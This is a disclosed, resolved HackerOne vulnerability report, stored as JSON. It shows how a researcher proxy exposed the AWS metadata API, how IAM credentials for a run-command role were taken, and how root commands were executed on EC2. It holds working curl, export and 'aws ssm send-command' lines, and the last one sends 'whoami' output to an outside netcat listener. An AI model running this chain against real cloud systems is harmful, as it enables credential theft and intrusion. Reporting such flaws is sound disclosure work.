{"id":401136,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDExMzY=","url":"https://hackerone.com/reports/401136","title":"Remote Code Execution on Proxy Service (as root)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-09-28T17:44:07.000Z","submitted_at":"2017-09-28T17:44:07.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"michiel","url":"/michiel","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":31807,"url":"https://hackerone.com/redact","handle":"redact","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"profile":{"name":"██████","twitter_handle":"","website":"","about":"██████ "}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-27T17:48:44.909Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The proxy service used to provide researchers with access to certain programs on ██████ allows access to AWS's Metadata API. This Metadata API in turn is configured to expose temporary AWS access credentials for the AWS EC2 Run Command role. When this role is assumed by an AWS client (e.g. the CLI), it is possible to execute arbitrary commands on AWS EC2 instances.\n\n## Obtaining the AWS keys\nFirst up we are going to use cURL and to proof the AWS Metadata API is accessible:\n\n```\ncurl -vv http://169.254.169.254/latest/ -x '52.6.██.███:25603'\n```\n\nHere we are instructing cURL to load up AWS's Metadata API through the proxy. Since the proxy is hosted on AWS, and is not blocking traffic to internal IPs such as this API, we are able to gain access to it.\n\nTo generate a temporary pair of access keys, we will run the following command:\n\n```\ncurl -vv http://169.254.169.254/latest/meta-data/iam/security-credentials/runCommand -x '52.6.██.███:25603'\n```\n\nThe `runCommand` role is interesting and made me assume it was used for https://aws.amazon.com/ec2/run-command/.\n\n## Configuring AWS CLI\nYou will need to have the AWS CLI installed before you can continue.\n\nNow set the following environment variables:\n\n```\nexport AWS_ACCESS_KEY_ID=\u003c\"AccessKeyId\" you exposed in the last cURL command\u003e\nexport AWS_SECRET_ACCESS_KEY=\u003c\"SecretAccessKey\" you exposed in the last cURL commandt\u003e\nexport AWS_SESSION_TOKEN=\u003c\"Token\" you exposed in the last cURL command\u003e\n```\n\nNow in the same shell session you should be able to interact with several AWS services through the CLI.\n\n## Executing arbitrary commands as root\nSince the role name was `runCommand` I immediately went for AWS EC2 Systems Manager (specifically `aws ssm send-command`).\n\nWith the access keys configured, I ran the following AWS CLI command to proof the keys indeed did have sufficient permissions to execute arbitrary commands:\n\n```\naws ssm send-command --instance-ids \"i-05b████████adaa\" --document-name \"AWS-RunShellScript\" --comment \"whoami\" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1\n```\n\nOn my dev server I had a netcat listener running on port 8080 (`nc -vvkl 8080`) to capture the incoming cURL request. I also chose to execute a quick `whoami` command and pass it along as the path in the cURL HTTP call so I can quickly confirm what type of user is executing these commands.\n\nThe HTTP request came in as follows:\n\n```\nConnection from [52.73.██.██] port 8080 [tcp/http-alt] accepted (family 2, sport 45163)\nGET /root HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: 162.243.███.███:8080\nAccept: */*\n```\n\nThis was enough proof for me to conclude command execution is possible and these commands are executed as **root**.\n\nNote that I only tried this on one instance, but I am expecting there are more instances in the `us-east-1` region that allow this type of command execution (and potentially instances in other regions as well).","vulnerability_information_html":"\u003cp\u003eThe proxy service used to provide researchers with access to certain programs on ██████ allows access to AWS\u0026#39;s Metadata API. This Metadata API in turn is configured to expose temporary AWS access credentials for the AWS EC2 Run Command role. When this role is assumed by an AWS client (e.g. the CLI), it is possible to execute arbitrary commands on AWS EC2 instances.\u003c/p\u003e\n\n\u003ch2 id=\"obtaining-the-aws-keys\"\u003eObtaining the AWS keys\u003c/h2\u003e\n\n\u003cp\u003eFirst up we are going to use cURL and to proof the AWS Metadata API is accessible:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -vv http://169.254.169.254/latest/ -x \u0026#39;52.6.██.███:25603\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere we are instructing cURL to load up AWS\u0026#39;s Metadata API through the proxy. Since the proxy is hosted on AWS, and is not blocking traffic to internal IPs such as this API, we are able to gain access to it.\u003c/p\u003e\n\n\u003cp\u003eTo generate a temporary pair of access keys, we will run the following command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -vv http://169.254.169.254/latest/meta-data/iam/security-credentials/runCommand -x \u0026#39;52.6.██.███:25603\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003erunCommand\u003c/code\u003e role is interesting and made me assume it was used for \u003ca title=\"https://aws.amazon.com/ec2/run-command/\" href=\"/redirect?url=https%3A%2F%2Faws.amazon.com%2Fec2%2Frun-command%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://aws.amazon.com/ec2/run-command/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"configuring-aws-cli\"\u003eConfiguring AWS CLI\u003c/h2\u003e\n\n\u003cp\u003eYou will need to have the AWS CLI installed before you can continue.\u003c/p\u003e\n\n\u003cp\u003eNow set the following environment variables:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eexport AWS_ACCESS_KEY_ID=\u0026lt;\u0026quot;AccessKeyId\u0026quot; you exposed in the last cURL command\u0026gt;\nexport AWS_SECRET_ACCESS_KEY=\u0026lt;\u0026quot;SecretAccessKey\u0026quot; you exposed in the last cURL commandt\u0026gt;\nexport AWS_SESSION_TOKEN=\u0026lt;\u0026quot;Token\u0026quot; you exposed in the last cURL command\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow in the same shell session you should be able to interact with several AWS services through the CLI.\u003c/p\u003e\n\n\u003ch2 id=\"executing-arbitrary-commands-as-root\"\u003eExecuting arbitrary commands as root\u003c/h2\u003e\n\n\u003cp\u003eSince the role name was \u003ccode\u003erunCommand\u003c/code\u003e I immediately went for AWS EC2 Systems Manager (specifically \u003ccode\u003eaws ssm send-command\u003c/code\u003e).\u003c/p\u003e\n\n\u003cp\u003eWith the access keys configured, I ran the following AWS CLI command to proof the keys indeed did have sufficient permissions to execute arbitrary commands:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eaws ssm send-command --instance-ids \u0026quot;i-05b████████adaa\u0026quot; --document-name \u0026quot;AWS-RunShellScript\u0026quot; --comment \u0026quot;whoami\u0026quot; --parameters commands=\u0026#39;curl 162.243.███.███:8080/`whoami`\u0026#39; --output text --region=us-east-1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOn my dev server I had a netcat listener running on port 8080 (\u003ccode\u003enc -vvkl 8080\u003c/code\u003e) to capture the incoming cURL request. I also chose to execute a quick \u003ccode\u003ewhoami\u003c/code\u003e command and pass it along as the path in the cURL HTTP call so I can quickly confirm what type of user is executing these commands.\u003c/p\u003e\n\n\u003cp\u003eThe HTTP request came in as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eConnection from [52.73.██.██] port 8080 [tcp/http-alt] accepted (family 2, sport 45163)\nGET /root HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: 162.243.███.███:8080\nAccept: */*\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis was enough proof for me to conclude command execution is possible and these commands are executed as \u003cstrong\u003eroot\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eNote that I only tried this on one instance, but I am expecting there are more instances in the \u003ccode\u003eus-east-1\u003c/code\u003e region that allow this type of command execution (and potentially instances in other regions as well).\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":67,"voters":["dyuen","dirk","barbie_girl","tomdev","smiegles","cdl","jobert","krevetk0","hunter","bull","and 57 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3254043,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-17T17:44:07.000Z","updated_at":"2017-10-17T17:44:07.000Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"michiel","url":"/michiel"},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3254050,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-27T17:48:45.043Z","updated_at":"2018-08-27T17:48:45.043Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10013,"category":"researcher","content":"## Introduction\nI discovered this remote code execution (RCE) vulnerability on a proxy service used to track researcher activity. It was an opportunity for me to learn more about AWS, and specifically the dangers of AWS EC2 Systems Manager combined with an open metadata API. \n\n## Impact update\nAfter back and forth with the ██████ team, it became clear the vulnerable instance was hosted in a completely separate AWS account that was only shared with a limited number of identical instances. That makes it very unlikely this vulnerability could have been escalated to other applications such as ██████.com or ████.██████.com.\n\n## Disclosure\nAs a courtesy, I sent this write up to the organization prior to disclosure. Unfortunately, the program explicitly required anonymized disclosure, hence the heavy redaction. Despite the missing context from the disappointing lack of transparency, I hope the community still finds this summary valuable. \n\nEnjoy!","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eI discovered this remote code execution (RCE) vulnerability on a proxy service used to track researcher activity. It was an opportunity for me to learn more about AWS, and specifically the dangers of AWS EC2 Systems Manager combined with an open metadata API. \u003c/p\u003e\n\n\u003ch2 id=\"impact-update\"\u003eImpact update\u003c/h2\u003e\n\n\u003cp\u003eAfter back and forth with the ██████ team, it became clear the vulnerable instance was hosted in a completely separate AWS account that was only shared with a limited number of identical instances. That makes it very unlikely this vulnerability could have been escalated to other applications such as ██████.com or ████.██████.com.\u003c/p\u003e\n\n\u003ch2 id=\"disclosure\"\u003eDisclosure\u003c/h2\u003e\n\n\u003cp\u003eAs a courtesy, I sent this write up to the organization prior to disclosure. Unfortunately, the program explicitly required anonymized disclosure, hence the heavy redaction. Despite the missing context from the disappointing lack of transparency, I hope the community still finds this summary valuable. \u003c/p\u003e\n\n\u003cp\u003eEnjoy!\u003c/p\u003e\n"}]}